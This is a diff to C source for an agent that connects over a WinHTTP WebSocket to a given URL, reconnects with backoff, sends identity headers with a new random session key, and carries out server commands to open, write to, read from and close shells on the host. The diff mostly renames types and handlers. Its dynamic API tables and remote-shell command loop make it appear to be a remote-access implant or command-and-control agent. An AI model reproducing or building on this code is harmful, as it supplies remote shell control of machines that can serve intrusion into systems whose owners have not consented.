@@ -8,8 +8,9 @@
 #include "commands.h"
 #include "string.h"
 #include "wire.h"
+#include "random.h"
 
-static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived);
+static int run_session(Context *ctx, const WCHAR *url, int *long_lived, const CHAR *sessionKey);
 
 INT32 agent_main(const WCHAR *url)
 {
@@ -27,16 +28,23 @@ INT32 agent_main(const WCHAR *url)
     bs[0] = 1;  bs[1] = 2;  bs[2] = 4;  bs[3] = 8;  bs[4] = 16; bs[5] = 32;
     const int backoff_count = 6;
     int backoff_pos = 0;
-    agent_ctx ctx;
+    Context ctx;
 
     MemoryZero(shells, sizeof(shells));
     ctx.shells  = shells;
     ctx.winhttp = NULL;
 
+    Random random;
+    CHAR sessionKey[37];
+    if (!random.RandomUUID().ToString(sessionKey, sizeof(sessionKey))) {
+        LOG_ERROR("Failed to generate the runtime session key");
+        return RC_LOCAL_ERROR;
+    }
+
     int rc = RC_SESSION_LOST;
     while (rc == RC_SESSION_LOST) {
         int long_lived = 0;
-        rc = run_session(&ctx, url, &long_lived);
+        rc = run_session(&ctx, url, &long_lived, sessionKey);
 
         if (rc == RC_SESSION_LOST) {
             int wait_s = backoff_steps[backoff_pos];
@@ -53,7 +61,7 @@ INT32 agent_main(const WCHAR *url)
     return rc;
 }
 
-static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
+static int run_session(Context *ctx, const WCHAR *url, int *long_lived, const CHAR *sessionKey)
 {
     int rc = RC_SESSION_LOST;
     BOOL https = FALSE;
@@ -73,7 +81,7 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
         LOG_ERROR("Failed to resolve the WinHTTP table\n");
         return RC_LOCAL_ERROR;
     }
-    ((agent_ctx *)ctx)->winhttp = &winhttp;
+    ((Context *)ctx)->winhttp = &winhttp;
 
     *long_lived = 0;
 
@@ -132,9 +140,9 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
         LOG_ERROR("WinHttpSetOption UPGRADE_TO_WEB_SOCKET failed (GLE=%lu)", (unsigned long)kernel32.GetLastError());
         goto cleanup;
     }
-
+    
     CHAR headers_a[IDENTITY_HEADERS_SIZE];
-    headers_len = Handle_IdentityHeaders(headers_a);
+    headers_len = Handle_IdentityHeadersCommand(headers_a, sessionKey);
     if (headers_len == 0) {
         LOG_ERROR("identity header block does not fit\n");
         rc = RC_LOCAL_ERROR;
@@ -203,31 +211,28 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
             goto cleanup;
         }
 
-        if (opcode == CMD_EXIT) {
+        if (opcode == Command_Exit) {
             LOG_ERROR("Exit requested - terminating");
             rc = RC_EXIT;
             goto cleanup;
         }
 
-        unsigned char reply[8 + SHELL_READ_CHUNK + 1];
-        DWORD reply_len = 0;
+        unsigned char response_buffer[8 + SHELL_READ_CHUNK + 1];
+        PCHAR response = (PCHAR)response_buffer;
+        USIZE responseLength = 0;
 
-        if (opcode == CMD_OPEN_SHELL) {
-            err = Handle_ShellOpen(ctx, corr_id, reply, &reply_len);
-            if (err == NO_ERROR || err == STATUS_ERROR)
-                err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, reply, reply_len);
-        } else if (opcode == CMD_WRITE_SHELL && msg.length >= 13) {
-            err = Handle_ShellWrite(ctx, &msg, corr_id, reply, &reply_len);
-            if (err == STATUS_OK || err == STATUS_ERROR)
-                err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, reply, reply_len);
-        } else if (opcode == CMD_READ_SHELL && msg.length >= 13) {
-            err = Handle_ShellRead(ctx, &msg, corr_id, reply, &reply_len);
-            if (err == STATUS_OK || err == STATUS_ERROR)
-                err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, reply, reply_len);
-        } else if (opcode == CMD_CLOSE_SHELL && msg.length >= 13) {
-            err = Handle_ShellClose(ctx, &msg, corr_id, reply, &reply_len);
-            if (err == STATUS_OK || err == STATUS_ERROR)
-                err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, reply, reply_len);
+        if (opcode == Command_OpenShell) {
+            Handle_OpenShellCommand((PCHAR)msg.data, msg.length, &response, &responseLength, ctx);
+            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, (unsigned char *)response, (DWORD)responseLength);
+        } else if (opcode == Command_WriteShell && msg.length >= 13) {
+            Handle_WriteShellCommand((PCHAR)msg.data, msg.length, &response, &responseLength, ctx);
+            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, (unsigned char *)response, (DWORD)responseLength);
+        } else if (opcode == Command_ReadShell && msg.length >= 13) {
+            Handle_ReadShellCommand((PCHAR)msg.data, msg.length, &response, &responseLength, ctx);
+            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, (unsigned char *)response, (DWORD)responseLength);
+        } else if (opcode == Command_CloseShell && msg.length >= 13) {
+            Handle_CloseShellCommand((PCHAR)msg.data, msg.length, &response, &responseLength, ctx);
+            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, (unsigned char *)response, (DWORD)responseLength);
         } else {
             unsigned char status_error[8];
             MemoryZero(status_error, sizeof(status_error));
